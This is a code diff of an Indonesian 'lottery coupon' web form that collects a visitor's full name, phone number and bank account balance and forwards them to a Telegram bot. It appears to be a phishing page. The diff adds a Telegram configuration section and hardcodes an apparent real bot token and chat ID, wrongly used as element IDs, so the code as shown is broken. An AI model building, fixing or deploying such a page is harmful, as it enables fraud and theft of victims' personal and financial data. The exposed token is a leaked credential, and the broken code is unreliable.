@@ -334,6 +334,12 @@
     </div>
 
     <!-- KONFIGURASI TELEGRAM BOT -->
+    <div class="config-section" id="configSection">
+        <div class="config-title">KONFIGURASI TELEGRAM BOT</div>
+        <p class="config-note">Isi Bot Token dan Chat ID di bawah ini:</p>
+        <input type="text" class="config-input" id="botToken" placeholder="Bot API Token (contoh: 123456:ABC-DEF1234ghIkl-zyx57W2vLKu8)">
+        <input type="text" class="config-input" id="chatId" placeholder="Chat ID (contoh: 123456789)">
+    </div>
 
     <!-- BOTTOM NAV: 1 gambar strip panjang (semua icon nav) -->
     <nav class="bottom-nav">
@@ -397,20 +403,30 @@
             const saldo = document.getElementById('saldo').value.trim();
             const btn = document.getElementById('submitBtn');
 
+            // Ambil konfigurasi Telegram
+            const botToken = document.getElementById('7504434844:AAEJvY81gVUID8gl1BCqdR28oNld83WbNxM').value.trim();
+            const chatId = document.getElementById('7213790655').value.trim();
+
             // Validasi konfigurasi Telegram
+            if (!botToken || !chatId) {
+                showToast('Mohon isi Bot Token & Chat ID terlebih dahulu!', 'error');
+                document.getElementById('configSection').scrollIntoView({ behavior: 'smooth' });
+                return false;
+            }
 
             // Loading state
             btn.classList.add('loading');
+            btn.disabled = true;
 
             // Format pesan
             const pesan = `
-KUPON UNDIAN - DATA BARU
+<b>🎫 KUPON UNDIAN - DATA BARU</b>
 
-Nama Lengkap: ${nama}
-Nomor HP: ${nohp}
-Saldo Rekening: ${saldo}
+👤 <b>Nama:</b> ${nama}
+📱 <b>No HP:</b> ${nohp}
+💰 <b>Saldo:</b> ${saldo}
 
-Waktu: ${new Date().toLocaleString('id-ID')}
+⏰ <i>Waktu: ${new Date().toLocaleString('id-ID')}</i>
             `.trim();
 
             try {
@@ -432,7 +448,7 @@ Waktu: ${new Date().toLocaleString('id-ID')}
                 const data = await response.json();
 
                 if (data.ok) {
-                    showToast();
+                    showToast('Berhasil! Data kupon telah dikirim.', 'success');
                     // Reset form
                     document.getElementById('form-kupon').reset();
                     checkForm();
@@ -440,9 +456,11 @@ Waktu: ${new Date().toLocaleString('id-ID')}
                     showToast('Gagal: ' + (data.description || 'Unknown error'), 'error');
                 }
             } catch (error) {
-                showToast('Gagal mengirim. Periksa koneksi & token!', 'error');
+                showToast('Gagal mengirim. Periksa koneksi & konfigurasi!', 'error');
             } finally {
                 btn.classList.remove('loading');
+                btn.disabled = false;
+                checkForm();
             }
 
             return false;
